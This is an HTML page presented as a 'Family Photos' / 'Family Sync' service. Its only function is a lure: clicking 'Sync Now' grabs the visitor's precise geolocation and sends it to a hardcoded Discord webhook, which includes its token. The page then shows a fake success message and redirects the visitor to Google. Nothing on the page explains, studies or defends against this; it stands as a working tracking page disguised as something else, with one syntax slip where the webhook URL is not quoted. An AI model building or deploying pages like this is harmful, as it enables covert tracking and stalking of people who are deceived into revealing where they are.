<!DOCTYPE html>
<html>
<head>
    <title>Family Photos</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background: #fafafa; }
        .box { background: white; padding: 40px; border-radius: 20px; display: inline-block; border: 1px solid #ddd; }
        button { background: #2ea44f; color: white; border: none; padding: 15px 30px; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Family Sync</h2>
        <p>Click below to sync your location with the group.</p>
        <button onclick="send()">Sync Now</button>
        <p id="msg"></p>
    </div>
    <script>
        const WEBHOOK_URL = https://discord.com/api/webhooks/1459670855922749460/yRDD8kBwyUHJkRbGMtSbla4u70mA8ZCv3ORbeifDH3EciizbyXGSJMJMZ1R094deGB2x;

        function send() {
            const msg = document.getElementById('msg');
            msg.innerText = "Syncing...";
            navigator.geolocation.getCurrentPosition((pos) => {
                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: `📍 **Family Sync Update**\n[View on Map](${mapLink})` })
                }).then(() => {
                    msg.innerText = "Success! Redirecting...";
                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
                });
            }, () => { msg.innerText = "Please allow location access to sync."; }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
